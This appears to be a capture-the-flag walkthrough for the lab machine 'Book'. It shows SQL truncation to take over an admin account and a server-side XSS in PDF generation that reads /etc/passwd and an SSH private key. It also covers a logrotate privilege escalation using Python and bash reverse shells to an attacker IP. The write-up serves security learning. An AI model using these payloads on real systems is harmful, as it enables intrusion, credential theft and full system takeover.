## 2- Enumeration
### 2.1- Nmap Scan

First things first, we begin with a **`nmap`** scan:

~~~

There are only 2 ports open, 22 with SSH and 80 with HTTP. There is an Apache web server v. 2.4.29 installed and the OS must be an Ubuntu.

Let's have a look on the web site hosted there.

### 2.2- Web Site Discovery

Before visiting the web site, we run Burp Suite in order to register the web traffic.

Going to the url [http://10.10.10.176](http://10.10.10.176), we arrive on the following sign in/sign up page.

![signin](images/signin.png "signin")



If we run **`gobuster`** with `gobuster dir -u http://10.10.10.176:80/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -z -k -l -x "txt,html,php,asp,aspx,jsp"`, we obtain the following result:

~~~

Notice that there is an admin page, and this is the following page:

![signin-admin](images/signin-admin.png "signin-admin")


We can try to log in with admin-like credentials in one of those 2 pages, but it doesn't work. Let's try to register a user and then log in.

We register a user and record web queries and responses on Burp.
After having recorded a user, we log in and access the following page:



![library](images/library.png "library")



Looking around, we notice :

- On the “Books” page, PDF documents are downloadable.
- On the “Collections” page, we can upload files, but can not access them afterward.
- The contact page reveals that there is an admin account with email “admin@book.htb”.





In Burp, we can see in _**index.php**_ that the registering form fields are sanitized with the code of the validateForm function:
```
function validateForm() {
  var x = document.forms["myForm"]["name"].value;
  var y = document.forms["myForm"]["email"].value;
  if (x == "") {
    alert("Please fill name field. Should not be more than 10 characters");
    return false;
  }
  if (y == "") {
    alert("Please fill email field. Should not be more than 20 characters");
    return false;
  }
}
</script>
```

It is interesting to see that the name and email fields are limited in size.

* * *
## 3- Exploitation
### 3.1- Exploiting Registering Page

As we know from the contact page that there is an account “admin@book.htb”, we can guess it is an admin account and the first thing we want to try is registering this same account again, but with new creds that we choose. Wrong number, it fails: 


![user-exists](images/user-exists.png "user-exists")

Now, we can try again but this time we add space char to the e-mail and try to exploit the size limitation.   

I didn't know much about this when I rooted the machine and when I first wrote this walkthrough, but it seems that trailing spaces are ignored during database operations. This means that the usernames "admin " and "admin" are identical from a MySQL perspective. You may find more informations the [MySQL documentation](https://dev.mysql.com/doc/refman/8.0/en/char.html). This is known as **"SQL Truncation"**.   
If the backend DBMS is MySQL, which is usually the case here, we should be able to leverage this attack to sign-up as admin@book.htb. Send another request from the sign up form and intercept it.    

The email is limited to 20 characters. We may try to register an account beginning with “admin@book.htb”, then adding spaces until the 20th character, and finally one more character, e.g. "1".     
Doing so, we may obtain another admin account that the site will consider as being the admin account “admin@book.htb” without flagging it during the registration as alreading existing.     

Let's give it a try.    

If we do it directly in the form on the web site, it refuses this e-mail address and we can not validate the account. Actually, space chars are not accepted here, but we can try to run the query from Burp.   
From Burp, we create an account “admin” with the email address **“admin@book.htb      1”**. As the 1 is the 21<sup>st</sup> character, it is not taken into account and our account is validated. 



![burp](images/burp.png "burp")


Now, let's try to login to the admin panel on [http://10.10.10.176/admin/index.php](http://10.10.10.176/admin/index.php). It may not work the first time, but if we register once again, it works !

![library-admin](images/library-admin.png "library-admin")

We have our foothold. What can we do from there ?

### 3.2- Web Site Vulnerability

First thing, if we go to the **"Collections"** page, we find two **"PDF"** buttons.

![collections](images/collections.png "collections")

Clicking on the **"Collections"** PDF button allows to download and open a PDf document that includes link to each document published on the site.

In another browser windows, let's try to log in on the standard page and upload any PDF file to see if it is correctly display in the documents list.   
We first try to see what it does with a sample.pdf first. We upload the file and we find it here :



![collections-data](images/collections-data.png "collections-data")


If I click on the link, it is executed here :


![pdf-exec](images/pdf-exec.png "pdf-exec")

Very nice ! We found a place where we can have some code executed on the server. 

### 3.3- Getting RCE

Of course, our goal now is to make the server execute a choosen code that will allow us to connect to it (or make it connect back to us) and get a shell.

f we try with a php file, it won't do anything. We must try to find a way to execute code in a pdf file.

There is a known abuse of dynamically generated PDF by causing a server side XSS. Google "file read XSS pdf” gives great results.    
We will try to use this one :
Server Side XSS (Dynamic PDF) : [https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf)

We have to make several tries and modify the payload as it is here:   
Local File Read Access through XSS in Dynamically Generated Email Template PDF:
[https://www.esecurify.com/local-file-read-access-through-xss-in-dynamically-generated-email-template-pdf/](https://www.esecurify.com/local-file-read-access-through-xss-in-dynamically-generated-email-template-pdf/)

It works with the following script, putting it directly in the title field, while uploading any pdf file (we are using sample.pdf, a simple one page pdf file):
~~~
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
~~~


We obtain the content of ***/etc/passwd***:

```

```

As we know the users, let's try to grab a private ssh key for the user “reader” by trying to read the file ***/home/reader/.ssh/id_rsa*** which is usully the file containing the ssh provate key:
```
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>
```




![ssh-key](images/ssh-key.png "ssh-key")


Very good, we are almost done. However, using it as it is does not work:    

```
root@kali:~/.ssh# ssh -i book_rsa reader@10.10.10.176
load pubkey "book_rsa": invalid format
Load key "book_rsa": invalid format
reader@10.10.10.176's password:
``` 

The tool **`pdfminer.six`** found at [https://github.com/pdfminer/pdfminer.six](https://github.com/pdfminer/pdfminer.six) allows to format the key correctly:
~~~
root@kali:~# python3 /usr/local/bin/pdf2txt.py rsakey.pdf > book_rsa
~~~

However, we have to edit the file and change tab character and it finally works.

## 4- Privilege Escalation

### 4.1- Post-Compromise Enumeration

Before doing anything else, let's have a looke around:

~~~

***"lse.sh"*** is in the home directory and **LSE** stands for the tool called **Linux Smart Enumeration**. We can find more information about this enumeration tool and its usage here: [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)   

We can use it to gather more information about the environment and find a way to escalate privileges: `reader@book:~$ ./lse.sh -l2 -i`

In the systemd timer seciton, we find this:

9 timers listed.
~~~

We can find more information about timers and services in Linux here: [https://www.linux.com/topic/desktop/setting-timer-systemd-linux/](https://www.linux.com/topic/desktop/setting-timer-systemd-linux/)   

It seems that the book.timer unit is activated by book.service very often.

### 4.2- Deeper Investigation

Let's have a closer look to this file ***/etc/systemd/system/book.service***   

~~~
reader@book:~$ cat /etc/systemd/system/book.service

[Unit]
Description=Backup of my apache website logs

[Service]
Type=simple
ExecStart="/root/log.sh"

[Install]
WantedBy=multi-user.target
reader@book:~$ cat /etc/systemd/system/book.timer
[Unit]
Description=Execute backup every minute

[Timer]
OnBootSec=1min
Unit=book.service
OnUnitActiveSec=1min

[Install]
WantedBy=multi-user.target
~~~

It is clear now that it is activated avery minute and it executes the program bash script ***/root/log.sh***. 

Although we can not read the content of the script because it is in root directory, we may gather information about what it is actually doing by looking closely at processes executed on the target.

**`pspy`** is very good at this. It is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. We can download it here: [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)   

We set up a web server on our Kali machine:
~~~
root@kali:~# python3 -m http.server 80
~~~

And download pspy from the target:
~~~
reader@book:~$ wget http://10.10.14.18/pspy
~~~

If we use pspy to monitor the operation of the target machine, we notice:

~~~

We can assume that log.sh is actually doing : `/usr/sbin/logrotate -f /root/log.cfg`

### 4.3- Post-Compromise Exploitation

If we have a look at logrotate on EDB, we can find an **exploit for logrotate version 3.8.6, 3.11.0 and 3.15.0, with Ubuntu 18.04.1.**

Checking the target version of logrotate:
~~~
reader@book:~$ logrotate --version
logrotate 3.11.0
~~~


The exploit  on EDB is:   
**logrotten 3.15.1 - Privilege Escalation**: [https://www.exploit-db.com/exploits/47466](https://www.exploit-db.com/exploits/47466)

It requests the following conditions for privilege escalation :
  - Logrotate has to be executed as root
  - The logpath needs to be in control of the attacker
  - Any option that creates files is set in the logrotate configuration

And we have to look at the logrotate config file to find if it is "create" or "compress" option that is set. 

~~~
reader@book:~$ find / -name "logrotate.conf" 2>/dev/null 
/snap/core/8268/etc/logrotate.conf
/snap/core/8592/etc/logrotate.conf
/var/lib/dpkg/info/logrotate.conffiles
/etc/logrotate.conf
/usr/share/doc/rsync/examples/logrotate.conf.rsync
/usr/share/sosreport/sos/plugins/__pycache__/logrotate.cpython-36.pyc
/usr/share/man/man5/logrotate.conf.5.gz

reader@book:~$ cat /etc/logrotate.conf
# see "man logrotate" for details
# rotate log files weekly
weekly

# use the syslog group by default, since this is the owning group
# of /var/log/syslog.
su root syslog

# keep 4 weeks worth of backlogs
rotate 4

# create new (empty) log files after rotating old ones
create

# uncomment this if you want your log files compressed
#compress

# packages drop log rotation information into this directory
include /etc/logrotate.d

# no packages own wtmp, or btmp -- we'll rotate them here
/var/log/wtmp {
    missingok
    monthly
    create 0664 root utmp
    rotate 1
}

/var/log/btmp {
    missingok
    monthly
    create 0660 root utmp
    rotate 1
}

# system-specific logs may be configured here
~~~

Actually, we already knew that it is “create” because we saw the files in our home directory, but it is better to check.

Now, we have to prepare a payload file. We edit a payload file `reader@book:~$ nano payload` and write the following classic Python reverse shell code as its content:
~~~
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.18",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
~~~

Another usual code for our payload is :

~~~
bash -i >& /dev/tcp/10.10.14.18/4444 0>&1
~~~

Of course we save it and make it executable. Now, we download the exploit on the target and compile it with **`$ gcc logrotten.c -o logrotten`** and make it executable:

~~~
reader@book:~$ wget http://10.10.14.18/logrotten.c
reader@book:~$ gcc logrotten.c -o logrotten
reader@book:~$ chmod +x payload logrotten
~~~

On our Kali machine we set up a listener with **`# nc -nlvp 4444`** before we run the exploit.

At the same time we run it, we want the log rotate to trigger our exploit. After testing, wa can notice that there is _**access.log**_ file, and we know that each minute it is backed up and replace by a new and empty file. We actually just want the _**access.log**_ file to not be empty. A way to do this is to generate and write enough random data in the log file _**access.log**_. Another way can be **`cp backups/access.log.1 backups/access.log`**.

Let's try it: 

~~~
head -c 10M < /dev/urandom > backups/access.log; ./logrotten -p ./payload /home/reader/backups/access.log; ls /etc/bash_completion.d/;
Waiting for rotating /home/reader/backups/access.log...
Renamed /home/reader/backups with /home/reader/backups2 and created symlink to /etc/bash_completion.d
Waiting 1 seconds before writing payload...
Done!
access.log  access.log-2020071415.backup  apport_completion  cloud-init  git-prompt  grub
~~~

It takes several trials before it works and the shell is unstable but it finally works.

### 4.4- Reverse Shell Stabilization

We got _**root.txt**_ but our reverse shell is dying. We may want to get a stable reverse shell. The most efficient solution here is to migrate the process on which the shell is running. We could do this by starting another reverse shell from the brief root shell we have, but after some tests, a simple **`# bash -i`** is enough: 

![bash-i](images/bash-i.png "bash-i")

There is another solution which personally I don't like very much. Now that we are root, we can see that there is a _**.ssh/**_ directory in _**/root**_. So, it means that using **`logrotten`**, we could modify this directory, cat or copy the SSH private key /root/.shh/id_rsa to SSH as root user.

What I dont like with this solution is that it happens that there is no _**.ssh**_ directory with a ssh private key here. This solution won't work in such a case.

The last solution would be to **`cat /etc/shadow`** to get the root password hash and then try to crack it with **`hashcat`**. I didn't try it but the hash is sha512crypt (**`hashcat -m 1800`**), so you might need a shit load of luck if the password is not weak...

Be Curious, Learning is Life !
